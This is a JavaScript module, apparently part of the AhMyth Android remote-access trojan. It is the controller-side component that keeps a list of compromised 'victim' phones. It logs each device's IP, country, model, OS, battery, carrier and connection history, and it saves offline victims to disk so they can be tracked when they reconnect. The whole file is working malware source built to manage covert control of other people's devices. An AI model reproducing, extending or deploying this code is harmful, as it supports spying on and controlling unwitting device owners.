var Victim = function(socket, ip, port, country, manf, model, release, extra) {
    this.socket = socket;
    this.ip = ip;
    this.port = port;
    this.country = country;
    this.manf = manf;
    this.model = model;
    this.release = release;
    // Extra device info
    extra = extra || {};
    this.sdk = extra.sdk || '';
    this.battery = extra.battery !== undefined ? parseInt(extra.battery) : -1;
    this.operator = extra.operator || '';
    this.device = extra.device || '';
    this.brand = extra.brand || '';
    this.product = extra.product || '';
    this.connectedAt = Date.now();
    this.lastSeen = Date.now();
    this.isOnline = true;
    this.totalConnections = 1;
    this.sessionDuration = 0;
};


class Victims {
    constructor() {
        this.victimList = {};
        this.offlineList = {}; // Keep track of offline victims
        this.instance = this;
        this.persistencePath = null;
        this.loadPersistedVictims();
    }
    
    // Set persistence path (called from main.js)
    setPersistencePath(path) {
        this.persistencePath = path;
        this.loadPersistedVictims();
    }
    
    // Load persisted victims from disk
    loadPersistedVictims() {
        if (!this.persistencePath) {
            try {
                const path = require('path');
                const homedir = require('node-homedir');
                const fs = require('fs-extra');
                const dataPath = path.join(homedir(), 'AhMyth');
                this.persistencePath = path.join(dataPath, 'victims.json');
            } catch (e) {
                // Can't load without path - will be set later
                return;
            }
        }
        
        try {
            const fs = require('fs-extra');
            if (!fs.existsSync(this.persistencePath)) {
                return; // No persisted data yet
            }
            
            const data = JSON.parse(fs.readFileSync(this.persistencePath, 'utf8'));
            if (data && data.offlineList && typeof data.offlineList === 'object') {
                // Restore offline victims (without socket)
                let restored = 0;
                for (const [id, victimData] of Object.entries(data.offlineList)) {
                    try {
                        if (!victimData || typeof victimData !== 'object') continue;
                        const victim = Object.assign({}, victimData);
                        victim.socket = null; // No socket for offline victims
                        victim.isOnline = false;
                        this.offlineList[id] = victim;
                        restored++;
                    } catch (e) {
                        console.error(`[Victims] Failed to restore victim ${id}:`, e.message);
                    }
                }
                if (restored > 0) {
                    console.log(`[Victims] Loaded ${restored} offline victim(s) from persistence`);
                }
            }
        } catch (e) {
            console.error('[Victims] Failed to load persisted victims:', e.message);
            // Don't throw - just log and continue
        }
    }
    
    // Save victims to disk
    savePersistedVictims() {
        if (!this.persistencePath) return;
        
        try {
            const fs = require('fs-extra');
            const path = require('path');
            
            // Ensure directory exists
            const dir = path.dirname(this.persistencePath);
            if (!fs.existsSync(dir)) {
                fs.mkdirSync(dir, { recursive: true });
            }
            
            // Serialize victims (exclude socket)
            const data = {
                offlineList: {}
            };
            
            for (const [id, victim] of Object.entries(this.offlineList)) {
                const serialized = { ...victim };
                delete serialized.socket; // Don't persist socket
                data.offlineList[id] = serialized;
            }
            
            fs.writeFileSync(this.persistencePath, JSON.stringify(data, null, 2), 'utf8');
        } catch (e) {
            console.error('[Victims] Failed to save persisted victims:', e.message);
        }
    }

    addVictim(socket, ip, port, country, manf, model, release, id, extra) {
        // Check if victim was previously offline
        if (this.offlineList[id]) {
            // Restore from offline and update
            var victim = this.offlineList[id];
            victim.socket = socket;
            victim.ip = ip;
            victim.port = port;
            victim.isOnline = true;
            victim.lastSeen = Date.now();
            victim.totalConnections++;
            victim.connectedAt = Date.now(); // Reset connection time
            Object.assign(victim, extra || {});
            this.victimList[id] = victim;
            delete this.offlineList[id];
            this.savePersistedVictims(); // Update persistence
        } else {
            var victim = new Victim(socket, ip, port, country, manf, model, release, extra || {});
            this.victimList[id] = victim;
        }
    }
    
    updateVictim(id, updates) {
        if (this.victimList[id]) {
            Object.assign(this.victimList[id], updates);
            this.victimList[id].lastSeen = Date.now();
        }
    }

    getVictim(id) {
        if (this.victimList[id] != null)
            return this.victimList[id];
        if (this.offlineList[id] != null)
            return this.offlineList[id];
        return -1;
    }

    setOffline(id) {
        if (this.victimList[id]) {
            var victim = this.victimList[id];
            victim.isOnline = false;
            victim.socket = null;
            victim.sessionDuration += Date.now() - victim.connectedAt;
            victim.wentOfflineAt = Date.now();
            this.offlineList[id] = victim;
            delete this.victimList[id];
            this.savePersistedVictims(); // Persist when going offline
        }
    }

    rmVictim(id) {
        delete this.victimList[id];
        delete this.offlineList[id];
    }

    getVictimList() {
        return this.victimList;
    }

    getAllVictims() {
        return { ...this.victimList, ...this.offlineList };
    }

    getOnlineCount() {
        return Object.keys(this.victimList).length;
    }

    getOfflineCount() {
        return Object.keys(this.offlineList).length;
    }

}



module.exports = new Victims();
